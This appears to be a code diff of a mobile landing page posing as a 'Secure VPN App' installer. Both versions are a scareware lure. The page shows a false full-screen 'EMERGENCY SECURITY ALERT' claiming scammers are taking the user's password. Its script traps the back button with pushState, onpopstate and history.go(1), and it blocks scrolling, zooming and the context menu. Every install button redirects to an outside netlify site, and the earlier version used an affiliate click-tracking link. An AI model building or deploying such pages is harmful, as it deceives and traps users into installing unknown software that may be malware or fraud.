@@ -1,137 +1,249 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Secure VPN App</title>
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      background-color: #0d0d0d;
-      font-family: Arial, sans-serif;
-      color: #ffffff;
-      text-align: center;
-    }
-
-    .container {
-      padding: 20px;
-    }
-
-    .vpn-link {
-      display: inline-block;
-      width: 100%;
-      max-width: 480px;
-    }
-
-    .vpn-image {
-      width: 100%;
-      border-radius: 12px;
-      margin-bottom: 25px;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-    }
-
-    .install-btn {
-      display: inline-block;
-      padding: 15px 30px;
-      background-color: #00c853;
-      color: #ffffff;
-      font-size: 18px;
-      font-weight: bold;
-      border-radius: 10px;
-      text-decoration: none;
-      box-shadow: 0 0 0 rgba(0, 200, 83, 0.7);
-      animation: breathing 2s infinite ease-in-out;
-    }
-
-    @keyframes breathing {
-      0% { box-shadow: 0 0 0 0 rgba(0, 200, 83, 0.7); }
-      50% { box-shadow: 0 0 20px 10px rgba(0, 200, 83, 0.3); }
-      100% { box-shadow: 0 0 0 0 rgba(0, 200, 83, 0.7); }
-    }
-
-    .disclaimer {
-      font-size: 13px;
-      color: #aaaaaa;
-      margin-top: 15px;
-    }
-
-    /* Custom fake alert box styling */
-    #customAlert {
-      display: none;
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background: #ffffff;
-      color: #000000;
-      border-radius: 10px;
-      padding: 20px;
-      z-index: 9999;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
-      width: 90%;
-      max-width: 320px;
-      text-align: center;
-      font-family: sans-serif;
-    }
-
-    #customAlert strong {
-      display: block;
-      margin-bottom: 10px;
-      color: #d50000;
-    }
-
-    #customAlert button {
-      margin-top: 15px;
-      padding: 10px 20px;
-      background: #00c853;
-      color: #fff;
-      border: none;
-      border-radius: 5px;
-      font-weight: bold;
-      cursor: pointer;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Secure VPN App</title>
+    <style>
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
+            -webkit-tap-highlight-color: transparent; 
+        }
+        
+        body { 
+            font-family: Arial, sans-serif; 
+            background-color: #0d0d0d; 
+            color: #ffffff; 
+            text-align: center; 
+            height: 100vh; 
+            overflow: hidden; 
+            touch-action: manipulation; 
+            position: fixed; 
+            width: 100%; 
+            user-select: none; 
+            -webkit-user-select: none; 
+            touch-action: pan-y;
+        } 
+        
+        .container { 
+            padding: 20px; 
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .vpn-link { 
+            display: inline-block; 
+            width: 100%; 
+            max-width: 480px; 
+        }
+        
+        .vpn-image { 
+            width: 100%; 
+            border-radius: 12px; 
+            margin-bottom: 25px; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5); 
+        }
+        
+        .install-btn { 
+            display: inline-block; 
+            padding: 15px 30px; 
+            background-color: #00c853; 
+            color: #ffffff; 
+            font-size: 18px; 
+            font-weight: bold; 
+            border-radius: 10px; 
+            text-decoration: none; 
+            box-shadow: 0 0 0 rgba(0, 200, 83, 0.7); 
+            animation: breathing 2s infinite ease-in-out; 
+            width: 100%;
+            max-width: 300px;
+            margin: 0 auto;
+            border: none;
+            cursor: pointer;
+        }
+        
+        @keyframes breathing { 
+            0% { box-shadow: 0 0 0 0 rgba(0, 200, 83, 0.7); } 
+            50% { box-shadow: 0 0 20px 10px rgba(0, 200, 83, 0.3); } 
+            100% { box-shadow: 0 0 0 0 rgba(0, 200, 83, 0.7); } 
+        }
+        
+        .disclaimer { 
+            font-size: 13px; 
+            color: #aaaaaa; 
+            margin-top: 15px; 
+        }
+        
+        .security-alert {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            padding: 20px;
+        }
+        
+        .alert-box {
+            background: linear-gradient(135deg, #d10000 0%, #8b0000 100%);
+            border: 3px solid #ff0000;
+            border-radius: 15px;
+            padding: 25px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.7);
+            animation: pulse 1.5s infinite;
+        }
+        
+        @keyframes pulse { 
+            0% { box-shadow: 0 0 15px rgba(255, 0, 0, 0.7); } 
+            50% { box-shadow: 0 0 30px rgba(255, 0, 0, 0.9); } 
+            100% { box-shadow: 0 0 15px rgba(255, 0, 0, 0.7); } 
+        }
+        
+        .alert-icon { 
+            width: 60px; 
+            height: 60px; 
+            margin-bottom: 15px; 
+        } 
+        
+        .alert-title {
+            font-size: 22px; 
+            margin-bottom: 15px; 
+            color: #fff; 
+            text-shadow: 0 2px 5px rgba(0,0,0,0.3); 
+        }
+        
+        .alert-message {
+            margin-bottom: 20px; 
+            font-size: 16px; 
+            line-height: 1.5;
+            font-weight: bold;
+        }
+        
+        .btn-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .alert-btn {
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .btn-protect {
+            background: linear-gradient(to right, #00c853, #00e676);
+            color: white;
+            box-shadow: 0 4px 0 #009624;
+        }
+        
+        .btn-cancel {
+            background: #333;
+            color: #ccc;
+        }
+        
+        .btn-cancel:active {
+            background: #444;
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <!-- Clickable Image -->
-    <a class="vpn-link" 
-       href="https://www.smallvalue.guru/click?offer_id=29716&pub_id=269631&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE" 
-       target="_blank">
-      <img src="https://files.catbox.moe/52ox56.jpg" alt="VPN Promo Image" class="vpn-image">
-    </a>
-
-    <!-- Breathing Install Button -->
-    <a class="install-btn" 
-       href="https://www.smallvalue.guru/click?offer_id=29716&pub_id=269631&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE" 
-       target="_blank">
-      Install Now
-    </a>
-
-    <div class="disclaimer">
-      100% Free • Fast & Secure Connection • Only 22.3MB
+    <div class="container">
+        <div class="vpn-link">
+            <img src="https://images.unsplash.com/photo-1563014959-7aaa83350992?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1200&q=80" class="vpn-image" alt="VPN Protection">
+            <button class="install-btn" id="installBtn">Install Now</button>
+            <div class="disclaimer">
+                100% Free • Fast & Secure Connection • Only 22.3MB
+            </div>
+        </div>
     </div>
-  </div>
+    
+    <div class="security-alert" id="securityAlert">
+        <div class="alert-box">
+            <img src="https://cdn-icons-png.flaticon.com/512/753/753345.png" class="alert-icon" alt="Warning">
+            <div class="alert-title">EMERGENCY SECURITY ALERT ⚠️</div>
+            <div class="alert-message">Scammers are accessing your password, install now</div>
+            <div class="btn-group">
+                <button class="alert-btn btn-protect" id="protectBtn">🔒 INSTALL VPN PROTECTION NOW</button>
+                <button class="alert-btn btn-cancel" id="cancelBtn">CANCEL (RISKY)</button>
+            </div>
+        </div>
+    </div>
 
-  <!-- Custom Fake Alert -->
-  <div id="customAlert">
-    <strong>system-alert.</strong>
-    <p>⚠️ Scammers are accessing your password, install now</p>
-    <button onclick="document.getElementById('customAlert').style.display='none'">OK</button>
-  </div>
-
-  <!-- Back Button Trap Script -->
-  <script>
-    let shown = false;
-    history.pushState(null, null, location.href);
-    window.onpopstate = function () {
-      if (!shown) {
-        shown = true;
-        document.getElementById('customAlert').style.display = 'block';
-        history.pushState(null, null, location.href); // Prevent immediate exit
-      }
-    };
-  </script>
+    <script>
+        // Initialize variables
+        let exitAttempted = false;
+        const securityAlert = document.getElementById('securityAlert');
+        const installBtn = document.getElementById('installBtn');
+        const protectBtn = document.getElementById('protectBtn');
+        const cancelBtn = document.getElementById('cancelBtn');
+        
+        // Show security alert immediately
+        securityAlert.style.display = 'flex';
+        
+        // Disable back button
+        history.pushState(null, null, location.href);
+        
+        // Handle exit attempts
+        function handleExitAttempt() {
+            if (!exitAttempted) {
+                exitAttempted = true;
+                alert("⚠️ Scammers are accessing your password, install now");
+            }
+        }
+        
+        // Block exit attempts
+        window.onpopstate = function(event) {
+            history.go(1);
+            handleExitAttempt();
+        };
+        
+        // Cancel button handler
+        cancelBtn.addEventListener('click', function() {
+            handleExitAttempt();
+            securityAlert.style.display = 'none';
+        });
+        
+        // Install button handlers
+        installBtn.addEventListener('click', function() {
+            window.location.href = 'https://antiqu-c.netlify.app/';
+        });
+        
+        protectBtn.addEventListener('click', function() {
+            window.location.href = 'https://antiqu-c.netlify.app/';
+        });
+        
+        // Prevent touch scrolling
+        document.addEventListener('touchmove', function(e) {
+            e.preventDefault();
+        }, { passive: false });
+        
+        // Prevent zooming
+        document.addEventListener('gesturestart', function(e) {
+            e.preventDefault();
+        });
+        
+        // Prevent context menu
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+    </script>
 </body>
 </html>
